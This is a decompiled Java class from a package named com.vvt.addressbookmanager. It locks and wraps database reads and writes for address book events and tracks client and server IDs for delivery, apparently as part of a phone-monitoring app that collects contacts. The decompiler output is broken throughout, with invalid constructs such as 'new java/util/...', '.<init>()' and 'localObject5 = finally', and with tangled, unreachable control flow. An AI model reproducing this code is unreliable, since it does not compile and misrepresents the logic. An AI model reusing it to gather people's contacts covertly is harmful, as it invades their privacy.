package com.vvt.addressbookmanager.c;

import android.content.Context;
import android.database.Cursor;
import com.vvt.addressbookmanager.d;
import com.vvt.events.FxAddressBookEvent;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.locks.ReentrantLock;

public class a
{
  private static final boolean a = d.a;
  private Context b;
  private String c;
  private final ReentrantLock d;
  
  public a(Context paramContext, String paramString)
  {
    ReentrantLock localReentrantLock = new java/util/concurrent/locks/ReentrantLock;
    localReentrantLock.<init>();
    this.d = localReentrantLock;
    this.b = paramContext;
    this.c = paramString;
  }
  
  public void a()
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Context localContext = this.b;
    String str = this.c;
    localc.<init>(localContext, str);
    this.d.lock();
    localContext = null;
    try
    {
      localc.a(false);
      localc.b();
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public void a(long paramLong, com.vvt.addressbookmanager.a.a parama, int paramInt)
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Context localContext = this.b;
    String str = this.c;
    localc.<init>(localContext, str);
    this.d.lock();
    localContext = null;
    try
    {
      localc.a(false);
      localc.a(paramLong, parama, paramInt);
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public void a(long paramLong, FxAddressBookEvent paramFxAddressBookEvent)
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Context localContext = this.b;
    String str = this.c;
    localc.<init>(localContext, str);
    this.d.lock();
    localContext = null;
    try
    {
      localc.a(false);
      localc.a(paramLong, paramFxAddressBookEvent);
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public void a(com.vvt.addressbookmanager.a.a parama, int paramInt1, int paramInt2, long paramLong)
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject1 = this.b;
    String str = this.c;
    localc.<init>((Context)localObject1, str);
    this.d.lock();
    localObject1 = null;
    try
    {
      localc.a(false);
      localObject1 = parama;
      localc.a(parama, paramInt1, paramInt2, paramLong);
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public void a(FxAddressBookEvent paramFxAddressBookEvent, int paramInt1, int paramInt2)
  {
    boolean bool = a;
    if (bool) {}
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject1 = this.b;
    String str = this.c;
    localc.<init>((Context)localObject1, str);
    this.d.lock();
    bool = false;
    localObject1 = null;
    try
    {
      localc.a(false);
      localc.a(paramFxAddressBookEvent, paramInt1, paramInt2);
      localc.a();
      localObject1 = this.d;
      ((ReentrantLock)localObject1).unlock();
      bool = a;
      if (bool) {}
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public boolean a(long paramLong)
  {
    boolean bool1 = true;
    Object localObject1 = null;
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject2 = this.b;
    Object localObject3 = this.c;
    localc.<init>((Context)localObject2, (String)localObject3);
    localObject2 = null;
    localObject3 = this.d;
    ((ReentrantLock)localObject3).lock();
    boolean bool2 = true;
    for (;;)
    {
      try
      {
        localc.a(bool2);
        localObject2 = localc.b(paramLong);
        if (localObject2 != null) {}
        int i;
        Object localObject4;
        bool1 = false;
      }
      finally
      {
        try
        {
          i = ((Cursor)localObject2).getCount();
          if (i > 0)
          {
            if (localObject2 != null) {
              ((Cursor)localObject2).close();
            }
            localc.a();
            this.d.unlock();
            return bool1;
          }
          bool1 = false;
          localObject4 = null;
          continue;
          localObject5 = finally;
          localObject1 = null;
        }
        finally
        {
          localObject1 = localObject2;
        }
        if (localObject1 != null) {
          ((Cursor)localObject1).close();
        }
        localc.a();
        this.d.unlock();
      }
      Object localObject7 = null;
    }
  }
  
  public void b()
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Context localContext = this.b;
    String str = this.c;
    localc.<init>(localContext, str);
    this.d.lock();
    localContext = null;
    try
    {
      localc.a(false);
      localc.c();
      localc.d();
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public void b(long paramLong, com.vvt.addressbookmanager.a.a parama, int paramInt)
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Context localContext = this.b;
    String str = this.c;
    localc.<init>(localContext, str);
    this.d.lock();
    localContext = null;
    try
    {
      localc.a(false);
      localc.b(paramLong, parama, paramInt);
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
  
  public boolean b(long paramLong)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject2 = this.b;
    Object localObject3 = this.c;
    localc.<init>((Context)localObject2, (String)localObject3);
    bool3 = false;
    localObject2 = null;
    localObject3 = this.d;
    ((ReentrantLock)localObject3).lock();
    boolean bool4 = true;
    for (;;)
    {
      try
      {
        localc.a(bool4);
        localObject2 = localc.c(paramLong);
        if (localObject2 != null) {}
        int i;
        Object localObject4;
        bool1 = false;
      }
      finally
      {
        try
        {
          i = ((Cursor)localObject2).getCount();
          if (i > 0)
          {
            if (localObject2 != null) {
              ((Cursor)localObject2).close();
            }
            localc.a();
            localObject1 = this.d;
            ((ReentrantLock)localObject1).unlock();
            bool2 = a;
            if (bool2) {}
            bool2 = a;
            if (bool2) {}
            return bool1;
          }
          bool1 = false;
          localObject4 = null;
          continue;
          localObject5 = finally;
          bool2 = false;
          localObject1 = null;
        }
        finally
        {
          localObject1 = localObject2;
        }
        if (localObject1 != null) {
          ((Cursor)localObject1).close();
        }
        localc.a();
        this.d.unlock();
      }
      Object localObject7 = null;
    }
  }
  
  public List c()
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject1 = this.b;
    Object localObject2 = this.c;
    localc.<init>((Context)localObject1, (String)localObject2);
    localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    localObject2 = null;
    Object localObject3 = this.d;
    ((ReentrantLock)localObject3).lock();
    boolean bool = true;
    try
    {
      localc.a(bool);
      localObject2 = localc.e();
      if (localObject2 != null) {
        for (;;)
        {
          bool = ((Cursor)localObject2).moveToNext();
          if (!bool) {
            break;
          }
          localObject3 = "_id";
          int i = ((Cursor)localObject2).getColumnIndex((String)localObject3);
          long l1 = ((Cursor)localObject2).getLong(i);
          String str1 = "client_id";
          int j = ((Cursor)localObject2).getColumnIndex(str1);
          long l2 = ((Cursor)localObject2).getLong(j);
          String str2 = "server_id";
          int k = ((Cursor)localObject2).getColumnIndex(str2);
          long l3 = ((Cursor)localObject2).getLong(k);
          com.vvt.addressbookmanager.delivery.c localc1 = new com/vvt/addressbookmanager/delivery/c;
          localc1.<init>();
          localc1.a(l2);
          localc1.c(l1);
          localc1.b(l3);
          ((List)localObject1).add(localc1);
        }
      }
      if (localObject2 == null) {
        break label222;
      }
    }
    finally
    {
      if (localObject2 != null) {
        ((Cursor)localObject2).close();
      }
      localc.a();
      this.d.unlock();
    }
    ((Cursor)localObject2).close();
    label222:
    localc.a();
    this.d.unlock();
    return localList;
  }
  
  public boolean c(long paramLong)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject2 = this.b;
    Object localObject3 = this.c;
    localc.<init>((Context)localObject2, (String)localObject3);
    bool3 = false;
    localObject2 = null;
    localObject3 = this.d;
    ((ReentrantLock)localObject3).lock();
    boolean bool4 = true;
    for (;;)
    {
      try
      {
        localc.a(bool4);
        localObject2 = localc.d(paramLong);
        if (localObject2 != null) {}
        int i;
        Object localObject4;
        bool1 = false;
      }
      finally
      {
        try
        {
          i = ((Cursor)localObject2).getCount();
          if (i > 0)
          {
            if (localObject2 != null) {
              ((Cursor)localObject2).close();
            }
            localc.a();
            localObject1 = this.d;
            ((ReentrantLock)localObject1).unlock();
            bool2 = a;
            if (bool2) {}
            return bool1;
          }
          bool1 = false;
          localObject4 = null;
          continue;
          localObject5 = finally;
          bool2 = false;
          localObject1 = null;
        }
        finally
        {
          localObject1 = localObject2;
        }
        if (localObject1 != null) {
          ((Cursor)localObject1).close();
        }
        localc.a();
        this.d.unlock();
      }
      Object localObject7 = null;
    }
  }
  
  public void d()
  {
    c localc = new com/vvt/addressbookmanager/c/c;
    Object localObject1 = this.b;
    String str = this.c;
    localc.<init>((Context)localObject1, str);
    localObject1 = this.d;
    ((ReentrantLock)localObject1).lock();
    boolean bool = true;
    try
    {
      localc.a(bool);
      localc.f();
      return;
    }
    finally
    {
      localc.a();
      this.d.unlock();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/MyUncaughtExceptionHandler/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */